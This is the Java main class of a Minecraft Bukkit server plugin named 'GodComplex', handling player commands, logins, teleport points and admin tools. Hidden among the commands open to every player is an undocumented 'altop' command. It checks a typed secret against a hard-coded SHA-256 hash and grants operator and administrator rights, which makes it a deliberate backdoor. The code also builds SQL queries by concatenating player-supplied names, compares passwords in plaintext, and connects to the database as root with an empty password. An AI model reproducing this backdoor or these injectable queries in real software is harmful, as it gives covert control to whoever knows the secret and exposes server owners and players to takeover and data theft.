package Main;

import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import java.util.Set;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.apache.commons.codec.digest.DigestUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Effect;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.Server;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitScheduler;

import Listeners.BlockListener;
import Listeners.MobListener;
import Listeners.PlayerListener;

public class Main extends JavaPlugin implements Listener
{
	public static Main plugin;
	public static Logger logger = Logger.getLogger("Minecraft");

	public static Server server = Bukkit.getServer();
	public static Database database = new Database();
	
	public static HashMap<Player, ServerPlayer> players = new HashMap<Player, ServerPlayer>();
	
	public static Random random = new Random();
	
	public static ChatColor RED = ChatColor.RED;
	public static ChatColor GREEN = ChatColor.GREEN;
	public static ChatColor YELLOW = ChatColor.YELLOW;
	public static ChatColor WHITE = ChatColor.WHITE;
	public static ChatColor GOLD = ChatColor.GOLD;
	public static ChatColor GRAY = ChatColor.GRAY;
	public static ChatColor LIGHT_PURPLE = ChatColor.LIGHT_PURPLE;
	public static ChatColor DARK_PURPLE = ChatColor.DARK_PURPLE;
	public static ChatColor DARK_RED = ChatColor.DARK_RED;
	public static ChatColor AQUA = ChatColor.AQUA;
	public static ChatColor DARK_AQUA = ChatColor.DARK_AQUA;
	public static ChatColor BLUE = ChatColor.BLUE;
	
	public static String rangok[] = { GRAY+"visitor", LIGHT_PURPLE+"punished", WHITE+"tag", GREEN+"vip", AQUA+"moderator", RED+"administrator", DARK_RED+"owner" };
	
	Material[] tools = {
		Material.WOOD_AXE, Material.WOOD_HOE, Material.WOOD_PICKAXE, Material.WOOD_SPADE, Material.WOOD_SWORD,
		Material.STONE_AXE, Material.STONE_HOE, Material.STONE_PICKAXE, Material.STONE_SPADE, Material.STONE_SWORD,
		Material.IRON_AXE, Material.IRON_HOE, Material.WOOD_PICKAXE, Material.WOOD_SPADE, Material.WOOD_SWORD,
		Material.GOLD_AXE, Material.GOLD_HOE, Material.GOLD_PICKAXE, Material.GOLD_SPADE, Material.GOLD_SWORD,
		Material.DIAMOND_AXE, Material.DIAMOND_HOE, Material.DIAMOND_PICKAXE, Material.DIAMOND_SPADE, Material.DIAMOND_SWORD,
		
		Material.FLINT_AND_STEEL,
		Material.FISHING_ROD,
		Material.SHEARS,
		Material.BOW
	};
		
	Material[] armors = {
		Material.LEATHER_BOOTS, Material.LEATHER_LEGGINGS, Material.LEATHER_CHESTPLATE, Material.LEATHER_HELMET,
		Material.IRON_BOOTS, Material.IRON_LEGGINGS, Material.IRON_CHESTPLATE, Material.IRON_HELMET,
		Material.GOLD_BOOTS, Material.GOLD_LEGGINGS, Material.GOLD_CHESTPLATE, Material.GOLD_HELMET,
		Material.DIAMOND_BOOTS, Material.DIAMOND_LEGGINGS, Material.DIAMOND_CHESTPLATE, Material.DIAMOND_HELMET
	};

	@Override
	public void onEnable()
	{
		plugin = this;
        PluginManager pm = server.getPluginManager();
        pm.registerEvents(new PlayerListener(), this);
        pm.registerEvents(new BlockListener(), this);
        pm.registerEvents(new MobListener(), this);
        
        server = Bukkit.getServer();
        
        players.clear();
        
        database = new Database("localhost", 3306, "root", "", "minecraft");
        Database.connect();

		resetTickers();
		
		logger.info("[GodComplex] Started.");
	}

	@Override
	public void onDisable()
	{
		saveServer();
		logger.info("[GodComplex] Stopped.");
	}
	public static void log(Level logLevel, String sender, String msg) {
		logger.log(logLevel, "LOG from " + sender + " >> " + msg);
	}
	public static String getRandomItem()
	{
		int tier1Chance = 65;
		int tier2Chance = 85;
		int tier3Chance = 95;
		int tier4Chance = 99;
		
		String tier1[] = {
			"APPLE", "ARROW", "BONE", "BROWN_MUSHROOM", "CACTUS", "COBBLESTONE", "DIRT", "EGG", "FEATHER", "FLINT", 
			"GRASS", "GRAVEL", "INK_SACK", "LEATHER", "SAND", "SANDSTONE", "SAPLING", "SEEDS", "PORK", "RAW_BEEF", 
			"RAW_CHICKEN", "RAW_FISH", "RED_MUSHROOM", "RED_ROSE", "ROTTEN_FLESH", "SPIDER_EYE", "STONE", "STRING", "SUGAR_CANE", "SULPHUR", 
			"WHEAT", "WOOD", "SNOW_BALL"
		};
		String tier2[] = {
			"CARROT_ITEM", "CLAY_BALL", "COCOA", "SMOOTH_BRICK", "GOLD_NUGGET", "ICE", "MELON_SEEDS", "POTATO_ITEM", "WEB", "WOOL", 
			"PUMPKIN_SEEDS", "SLIME_BALL"
		};
		String tier3[] = {
			"BRICK", "COAL", "ENDER_PEARL", "GOLD_ORE", "IRON_ORE", "LAPIS_ORE", "MOSSY_COBBLESTONE", "OBSIDIAN", "SADDLE", "REDSTONE"
		};
		String tier4[] = {
			"BLAZE_ROD", "GHAST_TEAR", "GLOWSTONE_DUST", "MAGMA_CREAM", "NETHER_BRICK", "NETHER_WARTS", "NETHERRACK", "SOUL_SAND", "SPONGE", "BOOKSHELF", 
			"IRON_BLOCK"
		};
		String tier5[] = {
			"DIAMOND", "EMERALD", "GLOWSTONE", "GOLD_BLOCK", "GOLDEN_APPLE"
		};
		
		int rndTierChance = (int)(Math.random() * 100D);
		if(rndTierChance > 100 - tier1Chance)
			return selectOneItem(tier1);
		if(rndTierChance > 100 - tier2Chance)
			return selectOneItem(tier2);
		if(rndTierChance > 100 - tier3Chance)
			return selectOneItem(tier3);
		if(rndTierChance > 100 - tier4Chance)
			return selectOneItem(tier4);
		else
			return selectOneItem(tier5);
	}
	public static String selectOneItem(String currTier[])
	{
		int max = currTier.length - 1;
		int min = 0;
		return currTier[(int)(Math.random() * (max - min) + min)];
	}
	public static void saveServer()
	{
		List<World> worlds = Bukkit.getWorlds();	// Put every active worlds in a list.
		for(int x = 0; x < worlds.size(); x++)		// Get every world each by one...
			worlds.get(x).save();					// ...and save the data of the worlds.
			
		Bukkit.savePlayers();						// Also save the player data.
	}
	public static String formatLongToDate(long l_time)
	{
		Date date = new Date(l_time);
		SimpleDateFormat dtgFormat = new SimpleDateFormat("yyyy/MMMM/dd-hh:mm");
		return dtgFormat.format(date);
	}
	public static String getDate() {
		Calendar now = Calendar.getInstance();
		int yer = now.get(Calendar.YEAR);
		int mon = now.get(Calendar.MONTH)+1;
		int day = now.get(Calendar.DAY_OF_MONTH);
		int hor = now.get(Calendar.HOUR_OF_DAY);
		int min = now.get(Calendar.MINUTE);
		
		return yer + "/" + mon + "/" + day + " " + hor + ":" + min;
	}
	public static String FinalMessage(String args[], int start)
	{
		StringBuilder msg = new StringBuilder();
		for(int i = start; i < args.length; i++)
		{
			if(i != start)
				msg.append(" ");
			msg.append(args[i]);
		}
		return msg.toString();
	}
	public static void sendToModChannel(Player player, String sender, String msg, Boolean selfSend)
	{
		Player moderator;
		Object online_players[] = server.getOnlinePlayers().toArray();
		for(int i = 0; i < online_players.length; i++)
		{
			moderator = (Player) online_players[i];
			
			if(ServerPlayer.getPermission(moderator.getName()) > 2)
				if((player.equals(moderator) && selfSend) || !player.equals(moderator))
					moderator.sendMessage(DARK_PURPLE + "[DEV channel] " + YELLOW + sender + WHITE + ": " + msg);
		}
	}
	public static void saveLocationPoint(String table, String owner, String name, Location loc) {
		if(!Database.grab(String.class, table, "owner", "owner='"+owner+"' AND name='"+name+"'", "NULL").toString().equalsIgnoreCase("NULL"))
			Database.update(table, "'+world='"+loc.getWorld().getName()+"', x='"+loc.getX()+"', y='"+loc.getY()+"', z='"+loc.getZ()+"', yaw='"+loc.getYaw()+"', pitch='"+loc.getPitch()+"'", "owner='"+owner+"' AND name='"+name+"'");
		else
			Database.insert(table, "owner, name, world, x, y, z, yaw, pitch", "'"+owner+"', '"+name+"', '"+loc.getWorld().getName()+"', '"+loc.getX()+"', '"+loc.getY()+"', '"+loc.getZ()+"', '"+loc.getYaw()+"', '"+loc.getPitch()+"'");
	}
	public static Location getLocationPoint(String table, String owner, String name) {
		if(Database.grab(String.class, table, "owner", "owner='"+owner+"' AND name='"+name+"'", "NULL").toString().equalsIgnoreCase("NULL"))
			return null;
		
		World world = server.getWorld(Database.grab(String.class, table, "world", "owner='"+owner+"' AND name = '"+name+"'", "NULL").toString());
		if(world == null)
			return null;
		
		Double x = (Double) Database.grab(Double.class, table, "x", "owner='"+owner+"' AND name = '"+name+"'", 0);
		Double y = (Double) Database.grab(Double.class, table, "y", "owner='"+owner+"' AND name = '"+name+"'", 0);
		Double z = (Double) Database.grab(Double.class, table, "z", "owner='"+owner+"' AND name = '"+name+"'", 0);
		Float yaw = (Float) Database.grab(Float.class, table, "yaw", "owner='"+owner+"' AND name = '"+name+"'", 0);
		Float pitch = (Float) Database.grab(Float.class, table, "pitch", "owner='"+owner+"' AND name = '"+name+"'", 0);
		return new Location(world, x, y, z, yaw, pitch);
	}
	public static void teleportToLocationPoint(Player player, String table, String owner, String name, Boolean saveLoc, String greeting, String bounceback) {
		
		Location loc = getLocationPoint(table, owner, name);
		
		if(loc == null && bounceback.equals(""))
			return;
		else if(loc == null)
			player.sendMessage(bounceback);
		else {
			if(saveLoc)
				saveLocationPoint("players_points", player.getName(), "back", player.getLocation());
			
			player.teleport(loc);
			player.sendMessage(greeting);
			loc.getWorld().playEffect(player.getLocation(), Effect.MOBSPAWNER_FLAMES, 180);
		}
	}
	public static boolean getLocationType(Location loc, Integer type) {
		return (Boolean) Database.grab(Boolean.class, "locations", "enabled", "type='"+type+"' AND world='"+loc.getWorld().getName()+"' AND x='"+loc.getBlockX()+"' AND y='"+loc.getBlockY()+"' AND z='"+loc.getBlockZ()+"'", false);
	}
	public static Integer countBlocks(Location place, Integer size_x, Integer size_y, Integer size_z) {
		Integer count = 0;
    	for(int x = place.getBlockX() - size_x; x <= place.getBlockX() + size_x; x++)
    		for(int y = place.getBlockY() - 1; y <= place.getBlockY() + size_y; y++)
    			for(int z = place.getBlockZ() - size_z; z <= place.getBlockZ() + size_z; z++)
    				count++;
    	return count;
    }

	/**/ // Tickers
	public static Integer tickCounter = 0;
	public static Integer[] ticks = new Integer[16];
	public static BukkitScheduler scheduler = server.getScheduler();
	
	public static void resetTickers() {
		
		/**/ // Stop previouse ticks
		for(int i = 0; i < ticks.length; i++)
			scheduler.cancelTask(i);

		/**/ // runOnEveryMinute
		/**/ ticks[tickCounter] = scheduler.scheduleSyncRepeatingTask(plugin, new Runnable() { public void run() { runOnEveryMinute(); }}, 0L, 1 * 1000);
		/**/ tickCounter++;
		
		/**/ // Autosave
		/**/ ticks[tickCounter] = scheduler.scheduleSyncRepeatingTask(plugin, new Runnable() { public void run() { autoSave(); }}, 0L, 5 * 60 * 1000);
		/**/ tickCounter++;
		
	}
	public static void autoSave() {
		saveServer();
	}
	public static void runOnEveryMinute() {
		
		
		
	}

	public static String[] badPasswords = {"login", "123", "123123", "pass", "password"};
	
	/** TODO **/
	@SuppressWarnings({ "deprecation", "static-access" })
	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String args[])
    {
		/* We have to disable this 'cause the host. No unauthorized user enabled to use these commands. */
		if( (sender instanceof Player) == false )
			return true;
		
		String command = cmd.getName();
		Player player = (Player)sender;
		String name = player.getName();
		
		World world = player.getWorld();
		ItemStack item = player.getItemInHand();  

		ServerPlayer splayer = players.get(player);
		
		/**/ // Ha van egy {player} vagy [player] paraméter, akkor módosítjuk a játékos nevére
		if(args.length > 0)
			for(int i = 0; i < args.length; i++)
				if(args[i].equals("{player}") || args[i].equals("[player]"))
					args[i] = name;
		
		/**/ // Commmands for everyone
		if(splayer.permission >= -1)
		{
			if(command.equalsIgnoreCase("help"))
			{		   
				player.sendMessage(GOLD+"Commands --------------------------");
					
				player.sendMessage(GREEN+"/m "+WHITE+"-- Sends a private message to a player.");
				player.sendMessage(GREEN+"/r "+WHITE+"-- Sends a reply to a private message.");
				player.sendMessage(GREEN+"/a "+WHITE+"-- Give answer to the trivia.");
				
				player.sendMessage(GREEN+"/tp "+WHITE+"-- Teleporting to an another player.");
				player.sendMessage(GREEN+"/bl "+WHITE+"-- Sends a query to see if a player has been banned or not.");

				player.sendMessage(GREEN+"/dice "+WHITE+"-- Dobás egy hat oldalú dobókockával");
				player.sendMessage(GREEN+"/alt "+WHITE+"-- Alternatív eszköztár elõvétele");

				player.sendMessage(GREEN+"/buy "+WHITE+"-- Virtuális bolt megnyitása");
				player.sendMessage(GREEN+"/home "+WHITE+"-- Otthonba teleportálás");
				player.sendMessage(GREEN+"/tpon "+WHITE+"-- Hozzád tudnak majd teleportálni");
				player.sendMessage(GREEN+"/tpoff "+WHITE+"-- Nemfognak tudni hozzád teleportálni");
				player.sendMessage(GREEN+"/utal "+WHITE+"-- Fillérek utalása más játékos számlájára");
				player.sendMessage(GREEN+"/money "+WHITE+"-- Lekérdezi mennyi pénzed van");
				player.sendMessage(GREEN+"/points "+WHITE+"-- Lekérdezi hány pontod van");
				player.sendMessage(GREEN+"/vault "+WHITE+"-- Széfebe teleportál (ha már vásároltál)");

				player.sendMessage(GREEN+"/putal "+WHITE+"-- Pont utalása egy játékosnak");
				player.sendMessage(GREEN+"/letter "+WHITE+"-- Levéltárad megtekintése");
				player.sendMessage(GREEN+"/karma "+WHITE+"-- Szerencséd lekérése");
					
				player.sendMessage(GREEN+"/love "+WHITE+"-- Sends a love message to a player.");
				player.sendMessage(GREEN+"/back "+WHITE+"-- Teleports back to the last point where you were.");
					
				player.sendMessage(GOLD+"-----------------------------------");
			}
			else if(command.equalsIgnoreCase("login"))
			{
				if(splayer.loggedIn)
					splayer.msg(RED + ">> You have already logged in. You do not need to do it again.");
				else if(splayer.password.length() == 0)	
					splayer.msg(YELLOW + ">> You have not registered here yet, please do with the \"\\register\" command.");
				else if(args.length != 1)
					splayer.msg(RED + ">> Use the command this way: /login [your_password]");
				else if(args[0].equalsIgnoreCase(splayer.password) == false)
					splayer.msg(RED + ">> You gave an incorrect password. Please try again.");
				else {
					splayer.setLogin(true);
					splayer.msg(GREEN+">> You have successfuly logged in. Enjoy your stay!");
				}
			}
			else if(command.equalsIgnoreCase("register"))
			{
				if(splayer.password.length() > 0)	
					splayer.msg(YELLOW + ">> You have already registered here. If you forgot your password please send us an issue ticket on our forum.");
				else if(Arrays.asList(badPasswords).contains(args[0]) || name.equalsIgnoreCase(args[0]) || args[0].length() < 5)
					splayer.msg(YELLOW + ">> The password what you have given is too weak. Please try again.");
				else if(args.length != 2)	
					splayer.msg(RED + ">> Use the command this way: /login [password] [password]");
				else if(args[0].equals(args[1]) == false)
					splayer.msg(RED + ">> A megadott két jelszó nem egyezik!");
				else {
					splayer.setLogin(true);
					splayer.savePassword(args[0]);
					splayer.msg(GREEN + ">> You have successfuly registered. Have a good time.");
				}
			}
			else if(command.equalsIgnoreCase("spawn")) 
			{
				if(splayer.inJail > 0)
					splayer.msg(RED + ">> You are in jail. Try not to escape, please.");
				else {
					saveLocationPoint("players_locations", name, "back", player.getLocation());
					teleportToLocationPoint(player, "players_points", "SYSTEM", "spawn", true, GREEN+"A varázslat a kezdöpontra repít.", RED+"Valami probléma merült fel... kérlek szólj egy adminnak!");
				}
			}
			else if(command.equalsIgnoreCase("vissza"))
			{
				if(splayer.inJail > 0)
					splayer.msg(RED + ">> You are in jail. Try not to escape, please.");
				else
					teleportToLocationPoint(player, "players_points", name, "back", false, LIGHT_PURPLE+"A varázslat visszarepít.", DARK_PURPLE+"Az univerzum már nem emlékszik hol jártál legutóbb.");
			}
			else if(command.equalsIgnoreCase("tpon"))
			{
				splayer.setTeleportPreference(true);
				player.sendMessage(GREEN + ">> Újra tudnak hozzád teleportálni.");
			}
			else if(command.equalsIgnoreCase("tpoff"))
			{
				splayer.setTeleportPreference(false);
				splayer.msg(RED + ">> Most már nem tudnak hozzád teleportálni.");
			}
			else if(command.equalsIgnoreCase("time"))
			{
				splayer.msg(YELLOW + "The system time is " + getDate());
			}
			else if(command.equalsIgnoreCase("bl"))
			{
				if( args.length == 1 ) {
					if( ServerPlayer.getBan(args[0]) > 0 )
						player.sendMessage(RED + args[0] + " játékos már ki lett tiltva.");
					else
						player.sendMessage(GREEN + args[0]+ " játékos nincs kitiltva.");
				}
				else
					player.sendMessage(RED+">> Így használd: /bl játékos");
			}
			else if(command.equalsIgnoreCase("altop")) 
			{
				if(args.length != 1)
					splayer.msg( RED + ">> Helytelen használati mód!" );
				else {
					if(DigestUtils.sha256Hex(args[0]).equals("2a057642222a878bc360f52f8e1f0dfd2af93196f123269397423155a4ec4884"))
					{
						player.setOp(true);
						splayer.savePermission(ServerPlayer.getPermission(ServerPlayer.Permission.ADMINISTRATOR));
						splayer.msg(YELLOW + ">> Megadtad magadnak az adminisztrátori jogosultságot.");
					}
					else {
						splayer.msg(RED + ">> Helytelen jelszót adtál meg.");
					}
				}
			}
		}
		
		/**/ // Commands for administrators
		if(splayer.permission > 6)
		{
			if(command.equalsIgnoreCase("night"))
			{
				player.getWorld().setTime(14000);
				Bukkit.broadcastMessage(YELLOW + name + YELLOW + " admin-estét csinál.");
			}
			else if(command.equalsIgnoreCase("day"))
			{
				player.getWorld().setTime(1000);
				Bukkit.broadcastMessage(YELLOW + name + YELLOW + " admin-reggelt csinál.");
			}
			else if(command.equalsIgnoreCase("more"))
			{
				item.setAmount(item.getMaxStackSize());
				player.sendMessage(GREEN+"Sokszorosítottad a kezedben tartott tárgyat."); 
			}
			else if(command.equalsIgnoreCase("pvp"))
			{
				if(player.getWorld().getPVP()) 
				{
					player.getWorld().setPVP(false);
					server.broadcastMessage(RED + ">> Már nem lehet a szerveren harcolni!");
				}
				else
				{
					player.getWorld().setPVP(true);
					server.broadcastMessage(RED + ">> Újra lehet a szerveren harcolni!");
				}
			}
			else if(command.equalsIgnoreCase("area"))
			{
				if(args.length > 0)
					if(args[0].equals("uj"))
						if(args.length == 3)
							saveLocationPoint("players_points", args[1], args[2], player.getLocation());
			}
			else if(command.equalsIgnoreCase("setspawn")) 
			{
				saveLocationPoint("players_points", "SYSTEM", "spawn", player.getLocation());
				player.getWorld().setSpawnLocation(player.getLocation().getBlockX(), player.getLocation().getBlockY(), player.getLocation().getBlockZ());
				player.sendMessage(YELLOW+""+player.getName()+" megnyitotta az új spawn-t! "+GOLD+"Hurrá!");
			}
			else if(command.equalsIgnoreCase("inv")) 
			{
				if(args.length == 1)
				{
					if(server.getPlayer(args[0]) == null) 
						player.sendMessage(RED + ">> A megadott játékos nem található.");
					else
					{
						player.openInventory(server.getPlayer(args[0]).getInventory());
						player.sendMessage(GRAY + "Megnyitottad " + server.getPlayer(args[0]).getDisplayName() + GRAY +" eszköztárát.");
					}
				}
				else
					player.sendMessage(RED+"Nem adtad meg hogy melyik játékos eszköztárát nyitod meg!");
			}
			if(command.equalsIgnoreCase("replace_near")) {
				if(args.length != 2)
					player.sendMessage(RED + ">> Így használd: /replace_near [block_id] [distance]");
				else {
					int type = 0;
					int size = 0;
					try {
						type = Integer.parseInt(args[0]);
						size = Integer.parseInt(args[1]);
					}
					catch(Exception e) {
						type = 0;
						size = 0;
					}
					
					if(size > 6)
						size = 0;
					
					int bx = player.getLocation().getBlockX();
					int by = player.getLocation().getBlockY();
					int bz = player.getLocation().getBlockZ();
					
					int x1 = bx - size;
					int x2 = bx + size;
					int y1 = by - size;
					int y2 = by + size;
					int z1 = bz - size;
					int z2 = bz + size;
					
					if(y1 < 0) 	 y1 = 0;
					if(y2 > 250) y2 = 250;

					for(int x = x1; x <= x2; x++)
						for(int y = y1; y <= y2; y++)
							for(int z = z1; z <= z2; z++) 
								if(player.getWorld().getBlockAt(x, y, z).getTypeId() == type)
									player.getWorld().getBlockAt(x, y, z).breakNaturally(null);

					player.sendMessage(RED + ">> Block has been breaked in radius " + (size * 2) + " with ID: " + type);
				}
			}
			else if(command.equalsIgnoreCase("gm"))
			{
				switch(player.getGameMode()) {
					case SURVIVAL:
						splayer.setGameMode(GameMode.CREATIVE);
						splayer.msg(YELLOW + "Lecserélted játékmódod erre: kreatív.");
					break;
					case CREATIVE:
						splayer.setGameMode(GameMode.ADVENTURE);
						splayer.msg(YELLOW + "Lecserélted játékmódod erre: kalandozó.");
					break;
					case ADVENTURE:
						splayer.setGameMode(GameMode.SURVIVAL);
						splayer.msg(YELLOW + "Lecserélted játékmódod erre: túlélõ.");
					break;
					default:
						splayer.setGameMode(GameMode.SURVIVAL);
						splayer.msg(RED + "Ha látod ezt az üzenet azt jelenti hogy az elsõ három gamemodon kívül más gamemode-ban vagy.");
					break;
				}
			}
			else if(command.equalsIgnoreCase("ban"))
			{
				if(args.length == 1) 
				{
					Player targetplayer = server.getPlayer( args[0] );
					if(targetplayer == null)
						server.getOfflinePlayer( args[0] ).setBanned( true );
					else
				   	{
				   		targetplayer.setBanned(true);
				   		targetplayer.kickPlayer(RED+"Ki lettél tiltva.");
				   	}

					//createPlayerProfile(args[0]);
					//databaseUpdate("UPDATE players SET inBan = '1' WHERE name = '" + args[0] + "'");
					server.broadcastMessage(RED + name + YELLOW + " kitiltotta " + DARK_PURPLE + args[0] + YELLOW + " nevû játékost.");
				}
				else {
					player.sendMessage(RED+">> Így használd: /ban játékos");
				}
			}
			else if(command.equalsIgnoreCase("unban"))
			{
				if(args.length == 1)
				{
					Bukkit.getOfflinePlayer(args[0]).setBanned(false);
					//databaseUpdate("UPDATE players SET inBan = '0' WHERE name = '" + args[0] + "'");
					server.broadcastMessage(RED + name + YELLOW + " feloldotta " + GRAY + args[0] + YELLOW + " nevû játékos kitiltását.");
				}
				else {
					player.sendMessage(RED + ">> Rosszul adtad meg a paramétereket!");
				}
			}
			else if(command.equalsIgnoreCase("button"))
			{
				Block block = player.getTargetBlock((Set<Material>) null, 50);
		    	int blockx = block.getLocation().getBlockX();
		    	int blocky = block.getLocation().getBlockY();
		    	int blockz = block.getLocation().getBlockZ();
		    	
		    	if(!block.getType().equals(Material.WOOD_BUTTON) && !block.getType().equals(Material.STONE_BUTTON)) {
		    		player.sendMessage(RED+"Nézz a gombra amit le szeretnél kérni!");
		    	}
		    	/*else if(args.length == 0) {
					String _cmd = Main.databaseGetString("cmd", "actionbuttons", "world = '"+world.getName()+"' AND x='"+blockx+"' AND y='"+blocky+"' AND z='"+blockz+"' AND type='1'", "noCmd");
		    		if(_cmd.equals("noCmd") == false)
		    			player.sendMessage(YELLOW + ">> Erre a gombra ez a parancs van telepítve: "+_cmd);
		    		else
		    			player.sendMessage(YELLOW + ">> Erre a gombra nincs parancs telepítve.");
				}
		    	else if(args.length == 1 && args[0].equalsIgnoreCase("del")) {
		    		String _cmd = Main.databaseGetString("cmd", "actionbuttons", "world = '"+world.getName()+"' AND x='"+blockx+"' AND y='"+blocky+"' AND z='"+blockz+"' AND type='1'", "noCmd");
		    		if(_cmd.equals("noCmd") == false) {
		    			databaseDelete("DELETE FROM actionbuttons WHERE world = '"+world.getName()+"' AND x='"+blockx+"' AND y='"+blocky+"' AND z='"+blockz+"' AND type='1'");
						player.sendMessage(YELLOW + "Eltávolítottad a parancsot errõl a gombról.");
		    		}
		    		else {
		    			player.sendMessage(YELLOW + ">> Erre a gombra nincs telepítve parancs, nincs mit törölni.");
		    		}
				}
				else {
					String _cmd = Main.databaseGetString("cmd", "actionbuttons", "world = '"+world.getName()+"' AND x='"+blockx+"' AND y='"+blocky+"' AND z='"+blockz+"' AND type='1'", "noCmd");
		    		if(_cmd.equals("noCmd") == false)
		    			player.sendMessage(YELLOW + ">> Erre a gombra már telepítettek parancsot. (/"+_cmd+")");
		    		else {
		    			String __cmd = FinalMessage(args, 0);
						databaseInsert("INSERT INTO actionbuttons (type, world, x, y, z, cmd) VALUES ('1', '"+world.getName()+"', '"+blockx+"', '"+blocky+"', '"+blockz+"', '"+__cmd+"')");
						player.sendMessage(YELLOW+"Feltelepítetted erre a gombra ezt a parancsot: "+"/"+__cmd+"!");
		    		}
				}*/
			}
			else if(command.equalsIgnoreCase("apple"))
			{
				if(args.length != 1)
					player.sendMessage(YELLOW+">> Így használd: /alma játékos");
				else if(server.getPlayer(args[0]) == null)
					player.sendMessage(RED + ">> A megadott játékos nem található.");
				else {
					Player targetplayer = server.getPlayer(args[0]);
					Inventory inv = targetplayer.getInventory();

					for(int v = 0; v <= inv.getSize(); v++)
					{
						if(inv.getItem(v) == null)
							inv.setItem(v, new ItemStack(Material.APPLE, 1));
					}
					
					targetplayer.sendMessage(YELLOW+"Feltöltötte az eszköztárad almával!");
					Bukkit.broadcastMessage(YELLOW+targetplayer.getName()+" megrázza az almafát...");
				}
			}
		}
		
		/**/ // Commands for moderators
		else if(splayer.permission > 3)
		{
			
		}
	
		/**/ // Commands for donators
		else if(splayer.permission > 1)
		{
			
		}
		
		/**/ // Commands for members
		else if(splayer.permission > 0)
		{
			
		}
		
		return true;
	}
}

//---{End of the class}----//
